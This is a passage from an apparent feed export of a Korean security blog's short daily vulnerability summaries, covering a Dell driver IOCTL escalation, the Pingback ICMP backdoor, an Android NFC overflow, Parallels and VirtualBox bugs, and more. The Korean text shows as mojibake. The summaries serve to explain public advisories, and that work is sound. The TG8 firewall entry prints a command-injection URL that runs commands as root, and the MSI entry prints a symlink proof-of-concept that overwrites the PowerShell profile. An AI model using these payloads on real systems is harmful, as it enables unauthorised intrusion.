ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìœ¼ë©° ë‹¨ì¼ CVEê°€ í• ë‹¹ë˜ì—ˆìŠµë‹ˆë‹¤.  ì²« ë²ˆì§¸ ì·¨ì•½ì ì€ <a href="https://ko.wikipedia.org/wiki/%EC%A0%91%EA%B7%BC_%EC%A0%9C%EC%96%B4_%EB%AA%A9%EB%A1%9D">ACL(Access Control List)</a> êµ¬ì„± ë¯¸í¡ìœ¼ë¡œ ë“œë¼ì´ë²„ê°€ ê¶Œí•œ ì—†ëŠ” ì‚¬ìš©ìì˜ IOCTL ìš”ì²­ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì–´ ë°œìƒí•©ë‹ˆë‹¤. ë”°ë¼ì„œ ê¶Œí•œ ì—†ëŠ” ì‚¬ìš©ìê°€ IOCTL <code>0x9B0C1EC8</code> ë¡œ <code>memmove</code> í•¨ìˆ˜ì— ì „ë‹¬ë˜ëŠ” ì¸ìˆ˜ë¥¼ ì œì–´í•  ìˆ˜ ìˆì–´ arbitrary memory read/writeê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ <code>EPROCESS</code>ì˜ í† í° ê¶Œí•œ ë©¤ë²„ì¸ <code>Present</code> ë° <code>Enabled</code>ì„ ë®ì–´ì“°ëŠ” ê²ƒìœ¼ë¡œ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì„ ì œë³´í•œ SentinelLabsëŠ” ì²« ë²ˆì§¸ë¥¼ ì œì™¸í•œ ë‚˜ë¨¸ì§€ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ ë° PoCëŠ” 2021ë…„ 6ì›” 1ì¼ê¹Œì§€ ê³µê°œë¥¼ ë³´ë¥˜í•˜ê² ë‹¤ê³  ë°í˜”ìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>arbitrary read</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary write</tag>
      
      <tag>dell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ICMP í„°ë„ë§ì„ ì‚¬ìš©í•œ ë°±ë„ì–´ Pingback</title>
    <link href="/2021/05/06/idioth/2021-05-06/"/>
    <url>/2021/05/06/idioth/2021-05-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/">Pingback: Backdoor At The End Of The ICMP Tunnel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ICMP í„°ë„ë§ì„ ì‚¬ìš©í•˜ì—¬ í†µì‹  íƒì§€ë¥¼ ìš°íšŒí•œ ë’¤ ê°ì—¼ëœ PCì—ì„œ ì§€ì†ì ìœ¼ë¡œ ì„ì˜ ëª…ë ¹ì„ ìˆ˜í–‰í•˜ëŠ” ë°±ë„ì–´ê°€ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì•…ì„±ì½”ë“œëŠ” ë°ì´í„°ë² ì´ìŠ¤, ë©”ì‹œì§€ í ë° íŒŒì¼ ì‹œìŠ¤í…œê³¼ ê°™ì€ ì—¬ëŸ¬ ë¦¬ì†ŒìŠ¤ ê´€ë¦¬ìì— ê±¸ì³ìˆëŠ” íŠ¸ëœì­ì…˜ì„ ì¡°ì •í•˜ëŠ” <a href="https://en.wikipedia.org/wiki/Microsoft_Distributed_Transaction_Coordinator">msdtc</a>(Microsoft Distributed Transaction Coordinator)ë¥¼ í†µí•´ ì•…ì„± DLL <code>oci.dll</code>ì„ í˜¸ì¶œí•˜ì—¬ ì§€ì†ì„±ì„ ìœ ì§€í•©ë‹ˆë‹¤. ë˜í•œ msdtcë¥¼ ì‹œì‘ í”„ë¡œê·¸ë¨ìœ¼ë¡œ ì„¤ì •í•˜ê¸° ìœ„í•´ SYSTEM ê¶Œí•œì„ í•„ìš”ë¡œ í•˜ë©° ë©€ì›¨ì–´ë¥¼ ì„¤ì¹˜í•  ë•Œ <a href="https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/sc-config">SC Command</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ ìœˆë„ìš° ì‹œìŠ¤í…œ ë””ë ‰í„°ë¦¬ì— <code>oci.dll</code>ë¥¼ ì„¤ì¹˜í•˜ê³  msdtcë¥¼ ì‹œì‘ í”„ë¡œê·¸ë¨ìœ¼ë¡œ ë“±ë¡í•©ë‹ˆë‹¤.</p><p><code>oci.dll</code>ì€ í†µì‹ ì— <a href="https://ko.wikipedia.org/wiki/%EC%9D%B8%ED%84%B0%EB%84%B7_%EC%A0%9C%EC%96%B4_%EB%A9%94%EC%8B%9C%EC%A7%80_%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C">ICMP(Internet Control Message Protocol)</a>ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ICMPëŠ” ë„¤íŠ¸ì›Œí¬ ê³„ì¸µ í”„ë¡œí† ì½œë¡œ ICMP íŒ¨í‚·ê³¼ ì—°ê³„ë˜ëŠ” TCP, UDP í¬íŠ¸ ë²ˆí˜¸ê°€ ì¡´ì¬í•˜ì§€ ì•Šì•„ <code>netstat</code>ì—ì„œ í†µì‹ ì„ ìˆ¨ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ICMP í”„ë¡œí† ì½œì„ í†µí•´ í†µì‹ ì„ í•˜ê¸° ìœ„í•´ <a href="https://en.wikipedia.org/wiki/ICMP_tunnel">ICMP í„°ë„ë§</a>ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. IPv4 ë„¤íŠ¸ì›Œí¬ì—ì„œ ICMP íŒ¨í‚·ì€ IPv4 í—¤ë”, ICMP í—¤ë”, ICMP ë°ì´í„°ë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤. Type 8 (Echo, ping) ICMP ë©”ì‹œì§€ë¥¼ ì „ì†¡í•˜ì—¬ ëª…ë ¹ì„ ìˆ˜í–‰í•˜ë©° íŒ¨í‚· ë°ì´í„° í˜•ì‹ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ICMPData</span> &#123;</span><span class="hljs-keyword">char</span> cmd[<span class="hljs-number">10</span>];    <span class="hljs-comment">// bot command</span><span class="hljs-keyword">char</span> args[<span class="hljs-number">512</span>];  <span class="hljs-comment">// extra parameter</span><span class="hljs-keyword">char</span> cmd_line[<span class="hljs-number">258</span>];  <span class="hljs-comment">// command line</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dest_port; <span class="hljs-comment">// destination port</span><span class="hljs-keyword">char</span> dest_addr[<span class="hljs-number">4</span>];  <span class="hljs-comment">// destination IP address</span>&#125;</code></pre><p>Pingbackì—ì„œ ì§€ì›í•˜ëŠ” ëª…ë ¹ì–´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li><strong>shell</strong> - ì‰˜ ì‹¤í–‰</li><li><strong>download</strong> - 3ê°œì˜ ëª¨ë“œê°€ ì¡´ì¬<ul><li>Mode 1: í•´ì»¤ì˜ í˜¸ìŠ¤íŠ¸ì— ê°ì—¼ëœ PCë¥¼ ë‹¤ì‹œ ì—°ê²°</li><li>Mode 2: ê°ì—¼ëœ PCê°€ ì§€ì •ëœ í¬íŠ¸ì— ì†Œì¼“ì„ ì—´ê³  í•´ì»¤ì˜ ì—°ê²°ì„ ê¸°ë‹¤ë¦¼</li><li>Mode 3: ICMP ê¸°ë°˜ìœ¼ë¡œ ë§¤ìš° ëŠë¦¬ê³  í˜„ì¬ êµ¬í˜„ ìƒ flow controlì„ ì‹ ë¢°í•  ìˆ˜ ì—†ìŒ</li></ul></li><li><strong>upload</strong> - ë‹¤ìš´ë¡œë“œ ëª…ë ¹ê³¼ ë¹„ìŠ·í•˜ê²Œ 3ê°œì˜ ëª¨ë“œë¥¼ ì§€ì›í•¨</li><li><strong>exec</strong> - ê°ì—¼ëœ PCì—ì„œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•¨</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>icmp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Android OOB write in NFC stack</title>
    <link href="/2021/05/05/fabu1ous/2021-05-05/"/>
    <url>/2021/05/05/fabu1ous/2021-05-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2144">OOB Write in NFC stack when handling MIFARE Classic TLVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Android-10</p><p>Android-11</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>ì•…ì„± NFC íŒ¨í‚·ì„ í†µí•œ ì•ˆë“œë¡œì´ë“œ RCE ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì•ˆë“œë¡œì´ë“œ NFCëŠ” í•¨ìˆ˜<code>rw_mfc_handle_read_op()</code>ë¥¼ ì‚¬ìš©í•´  ë¸”ë¡ ë‹¨ìœ„ ìš”ì²­ì„ ë³´ë‚´ê³  MFC(MIFARE Classic) ì¹´ë“œë¡œë¶€í„° NDEF(NFC Data Exchange Format)ë¥¼ ë°›ì•„ì˜µë‹ˆë‹¤. í•¨ìˆ˜ <code>rw_mfc_handle_read_op()</code> ëŠ” STATEì— ë”°ë¼ ë‹¤ìŒê³¼ ê°™ì´ ë™ì‘í•©ë‹ˆë‹¤.</p><ol><li><p>RW_MFC_STATE_DETECT_TLV</p><p>ë¸”ë¡ì˜ TLVë¥¼ íŒŒì‹±í•´  <code>p_mfc-&gt;ndef_length</code>ê°’ì„ ì €ì¥í•˜ê³  ê·¸ì— ë§ëŠ” ë²„í¼ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.</p></li><li><p>RW_MFC_STATE_READ_NDEF</p><p>ë¸”ë¡ì˜ TLVë¥¼ ë‹¤ì‹œ ë””ì½”ë”©í•´ <code>p_mfc-&gt;ndef_length</code>ê°’ì„ ì—…ë°ì´íŠ¸í•œ ë’¤ ë²„í¼ì— ë°ì´í„°ë¥¼ ë³µì‚¬í•©ë‹ˆë‹¤.</p></li></ol><p>ì•…ì„± NFC íŒ¨í‚·ì„ í†µí•´ ë‘ STATEì—ì„œ ì„œë¡œ ë‹¤ë¥¸ <code>p_mfc-&gt;ndef_length</code>ê°’ì„ ì‚¬ìš©í•˜ë„ë¡ ìœ ë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ buffer overflowê°€ ë°œìƒí•  ìˆ˜ ìˆìœ¼ë©° ì´ë¥¼ ì•…ìš©í•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ ê³µê²©ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>nfc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] TG8 Firewallì˜ PreAuth ì›ê²© ì½”ë“œì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/05/04/l0ch/2021-05-04/"/>
    <url>/2021/05/04/l0ch/2021-05-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/">SSD Advisory â€“ TG8 Firewall PreAuth RCE and Password Disclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TG8 Firewall</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="http://www.tg8security.com/firewall.html">TG8 Security</a> ì‚¬ì˜ ë°©í™”ë²½ì—ì„œ ì¸ì¦ë˜ì§€ ì•Šì€ root ê¶Œí•œì˜ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ ì¸ì¦ ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” <code>index.php</code> ì— ì¡´ì¬í•˜ë©° ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs php">...  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkLogin</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&#x27;input[name=u]&#x27;</span>).val();    <span class="hljs-keyword">var</span> pass = $(<span class="hljs-string">&#x27;input[name=p]&#x27;</span>).val();    <span class="hljs-keyword">var</span> cmd = <span class="hljs-string">&#x27;sudo /home/TG8/v3/syscmd/check_gui_login.sh &#x27;</span> + username + <span class="hljs-string">&#x27; &#x27;</span> + pass;    $.ajax(&#123;      url: <span class="hljs-string">&quot;runphpcmd.php&quot;</span>,      type: <span class="hljs-string">&quot;post&quot;</span>,      dataType: <span class="hljs-string">&quot;json&quot;</span>,      cache: <span class="hljs-string">&quot;false&quot;</span>,      data: &#123;        syscmd: cmd      &#125;,      success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">x</span>) </span>&#123;        <span class="hljs-keyword">if</span> (x == <span class="hljs-string">&#x27;OK&#x27;</span>) &#123;          ok(username);        &#125; <span class="hljs-keyword">else</span> &#123;          failed();        &#125;      &#125;,      <span class="hljs-built_in">error</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;      ok(username);        <span class="hljs-comment">// alert(&quot;failure to excute the command&quot;);</span>      &#125;    &#125;)  &#125;...</code></pre><p>ì¸ì¦ ìš”ì²­ì„ ë°›ìœ¼ë©´ ë¡œê·¸ì¸ì„ ì²˜ë¦¬í•˜ëŠ” <code>check_gui_login.sh</code> ì— <code>username</code>ê³¼ <code>pass</code>ë¥¼ ë§¤ê°œë³€ìˆ˜ë¡œ ëª…ë ¹ì„ êµ¬ì„±í•©ë‹ˆë‹¤. ì´ëŠ” <code>runphpcmd.php</code> ì˜ <code>syscmd</code>ë¡œ ì „ë‹¬ë˜ê³  root ê¶Œí•œìœ¼ë¡œ <code>check_gui_login.sh</code>ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜  <code>syscmd</code>ì— ëŒ€í•œ ì–´ë– í•œ ê²€ì‚¬ë„ ì¡´ì¬í•˜ì§€ ì•Šì•„ í•´ì»¤ê°€ ì„ì˜ì˜ ì½”ë“œë¥¼ í¬í•¨í•œ <code>syscmd</code>ë¥¼ ë§¤ê°œë³€ìˆ˜ë¡œ <code>runphpcmd.php</code>ì— ì§ì ‘ ìš”ì²­í•˜ë©´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ íŠ¸ë¦¬ê±° ë©ë‹ˆë‹¤. </p><p>root ê¶Œí•œìœ¼ë¡œ <code>ls</code> ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ëŠ” PoCëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;server&gt;/admin/runphpcmd.php?syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+%3Bls%3B++local</span></code></pre><p>ì œë³´ìëŠ” í•´ë‹¹ ì·¨ì•½ì  ì™¸ì—ë„ ì•¡ì„¸ìŠ¤ ê¶Œí•œ ì„¤ì • ë¯¸í¡ìœ¼ë¡œ ì¸í•´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ <code>/data/</code> ë””ë ‰í„°ë¦¬ì˜ ìê²© ì¦ëª… íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì •ë³´ìœ ì¶œ ì·¨ì•½ì  ë˜í•œ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.</p><p>ì´ë¥¼ í•´ë‹¹ ë°©í™”ë²½ ì¥ë¹„ì˜ ê³µê¸‰ ì—…ì²´ì¸ TG8ì—ê²Œ SNS ë° ì´ë©”ì¼ì„ í†µí•´ ì—¬ëŸ¬ ì°¨ë¡€ ì œë³´í•˜ì˜€ìœ¼ë‚˜ ê³µê¸‰ ì—…ì²´ë¡œë¶€í„° ì–´ë– í•œ ì‘ë‹µë„ ë°›ì§€ ëª»í–ˆë‹¤ê³  ë°í˜”ìœ¼ë©°, í•´ë‹¹ ì¥ë¹„ë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ë©´ ì¦‰ì‹œ ì™¸ë¶€ ì¸í„°ë„·ìœ¼ë¡œ í†µí•˜ëŠ” í¬íŠ¸ë¥¼ ì°¨ë‹¨í•  ê²ƒì„ ê°•ë ¥í•˜ê²Œ ê¶Œê³ í–ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>pre-auth</tag>
      
      <tag>L0ch</tag>
      
      <tag>firewall</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-26415: Microsoft Installer Local Privilege Escalation</title>
    <link href="/2021/05/03/idioth/2021-05-03/"/>
    <url>/2021/05/03/idioth/2021-05-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.cloaked.pl/2021/04/cve-2021-26415/">CVE-2021-26415</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Windows Installer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windows Installer(MSI)ì—ì„œ TOCTOUì™€ symlinkë¥¼ í†µí•œ Local Privilege Escalation ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. <code>msiexec</code>ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ê´€ë¦¬ì ê¶Œí•œì„ í•„ìš”ë¡œ í•˜ì§€ë§Œ repair operation ìˆ˜í–‰ì„ ìœ„í•´ <code>/f</code> ì˜µì…˜ì„ ì‚¬ìš©í•˜ë©´ ê¶Œí•œì´ ì—†ì´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>/L</code> ì˜µì…˜ê³¼ í•¨ê»˜ ì‚¬ìš©í•˜ë©´ ë¡œê·¸ íŒŒì¼ì„ ì§€ì •ëœ ê³³ì— ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs taggerscript">msiexec /f C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller<span class="hljs-symbol">\1</span>48d3c4.msi /L C:<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\f</span>oo.log</code></pre><p>symlinkë¥¼ í†µí•´ <code>foo.log</code>ê°€ ì²« CreatFileì—ì„œ ì‹œìŠ¤í…œ ê¶Œí•œìœ¼ë¡œ impersnation ë  ë•Œ oplockì„ ì„¤ì¹˜í•˜ë©´ ë‹¤ìŒ ì“°ê¸°/ì½ê¸° ì‘ì—…ì€ ì‹¬ë³¼ë¦­ ë§í¬ëœ íŒŒì¼ì—ì„œ ìˆ˜í–‰ë©ë‹ˆë‹¤. PowerShellì„ Overwriteí•˜ì—¬ LPEë¥¼ í•˜ëŠ” POCëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs latex">@echo offREM Put BaitAndSwitch, example.msi into C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span>echo &gt; C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">fakelog</span></span>.txtstart C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">BaitAndSwitch</span></span> C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">linkdir</span></span><span class="hljs-tag">\<span class="hljs-name">link</span></span> C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">fakelog</span></span>.txt C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>1.0<span class="hljs-tag">\<span class="hljs-name">profile</span></span>.ps1timeout /t 1msiexec /j C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">example</span></span>.msi /t ksz /Li! C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">linkdir</span></span><span class="hljs-tag">\<span class="hljs-name">link</span></span> /qn</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>toctou</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>msi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Two CVEs in Parallels Desktop RDPMC</title>
    <link href="/2021/05/01/fabu1ous/2021-05-01/"/>
    <url>/2021/05/01/fabu1ous/2021-05-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/4/26/parallels-desktop-rdpmc-hypercall-interface-and-vulnerabilities">PARALLELS DESKTOP RDPMC HYPERCALL INTERFACE AND VULN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Parallels Desktop 15.1.5 (Guest)</p><p>macOS Caltalina 10.15.7 (Host)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Parallels Desktopì—ì„œ hypercall ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ Guest ìœ ì €ê°€ Host ì»¤ë„ì—ì„œ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Parallels Desktopì€ RDPMC(Read Performance-Monitor Counter) instructionì„ ì‚¬ìš©í•˜ëŠ” hypercall ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ guestì™€ hostì˜ í†µì‹ ì„ ì§€ì›í•©ë‹ˆë‹¤. í•´ë‹¹ ì¸í„°í˜ì´ìŠ¤ëŠ” guest ìœ ì € ê¶Œí•œìœ¼ë¡œë„ ì ‘ê·¼í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— host VMM(Virtual Machine Monitor)ì˜ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•´ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ul><li><p>CVE-2021-31424 : Heap overflow</p><p>host VMMì€ guestì™€ ë°ì´í„°ë¥¼ ì£¼ê³ ë°›ì„ ë•Œ <code>ReadLinear()</code>ì™€ <code>WriteLinear()</code>ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. guest ìœ ì €ê°€ ì œì–´í•  ìˆ˜ ìˆëŠ” ë°ì´í„°(UEFI variable name)ì— ëŒ€í•œ ê¸¸ì´ ê²€ì¦ ë¯¸í¡ìœ¼ë¡œ ì¸í•´ í•´ë‹¹ ë°ì´í„°ë¥¼ ë³µì‚¬í•˜ëŠ” ê³¼ì •ì—ì„œ Heap overflowê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">OTGHandleGenericCommand</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> x)</span> </span><span class="hljs-function"></span>&#123;           <span class="hljs-comment">/* case 9 */</span>         MonReadLinear(regs.rsi, &amp;request, <span class="hljs-number">0x30</span>);          SharedMem-&gt;EFIVar.op = request.op;          ReadLinear(request.name, SharedMem-&gt;EFIVar.name, <span class="hljs-number">2</span> * request.size);        <span class="hljs-comment">// heap overflow when copying variable name from guest </span>        SharedMem-&gt;EFIVar.name[request.size] = <span class="hljs-number">0</span>;        ...</code></pre></li></ul><ul><li><p>CVE-2021-31427 : TOCTOU</p><p>guestì— ë³´ë‚´ì•¼ í•  ë°ì´í„°ì˜ í¬ê¸° ê°’(<code>EFIVar.datasize</code>) ê²€ì¦ì€ user spaceì—ì„œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. VMMê³¼ userspace ì‚¬ì´ ì»¨íŠ¸ë¡¤ ìœ„ì„ì„ ë‹´ë‹¹í•˜ëŠ” í•¨ìˆ˜ <code>MonRetToHostSwitch()</code>ì™€ ê³µìœ  ë©”ëª¨ë¦¬ë¡œë¶€í„°  <code>EFIVar.datasize</code>ë¥¼ ë³µì‚¬í•´ì˜¤ëŠ” í•¨ìˆ˜ <code>WriteLinear()</code> ì‚¬ì´ì—ì„œ race conditionì´ ë°œìƒí•©ë‹ˆë‹¤. ë°ì´í„° ê¸¸ì´ ê²€ì¦ê³¼ ë°ì´í„° ë³µì‚¬ ì‘ì—… ì‚¬ì´ì— <code>EFIVar.datasize</code>ê°’ì„ ë²ˆê²½í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë¯€ë¡œ host kernel ë°ì´í„°ì— ëŒ€í•œ OOB(out-of-bound) readë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>race condition</tag>
      
      <tag>mac</tag>
      
      <tag>heap overflow</tag>
      
      <tag>parallels</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-25319: VirtualBoxì˜ ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/04/30/l0ch/2021-04-30/"/>
    <url>/2021/04/30/l0ch/2021-04-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/78">virtualbox: CVE-2021-25319: missing sticky bit in openSUSE packaging for /etc/box allows local root exploit for members of vboxusers group </a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VirtualBox for openSUSE</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>oracleì‚¬ì˜ ì˜¤í”ˆì†ŒìŠ¤ ê°€ìƒ ë¨¸ì‹  ì†Œí”„íŠ¸ì›¨ì–´ì¸ VirtualBox openSUSE íŒ¨í‚¤ì§€ ë°°í¬íŒì—ì„œ íŠ¹ì • ê³„ì • ê·¸ë£¹ì˜ ìœ ì €ê°€ rootë¡œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><code>vboxusers</code> groupì€ VirtualBox ìë™ì‹œì‘ì„ ìœ„í•´ ë„ì…ë˜ì—ˆìœ¼ë©° VirtualBoxì˜ ì—¬ëŸ¬ êµ¬ì„± íŒŒì¼ì´ í¬í•¨ëœ  <code>/etc/vbox</code> ë””ë ‰í„°ë¦¬ì— ì“°ê¸° ê¶Œí•œì´ ë¶€ì—¬ëœ ìœ ì € ê·¸ë£¹ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ <code>/etc/vbox</code> ë””ë ‰í„°ë¦¬ì— sticky bit ì„¤ì •ì´ ëˆ„ë½ë˜ì–´ ìˆì–´ <code>vboxusers</code>ì— ì†í•œ ëª¨ë“  ìœ ì €ê°€ í•´ë‹¹ ë””ë ‰í„°ë¦¬ì˜ íŒŒì¼ì„ ì„ì˜ë¡œ 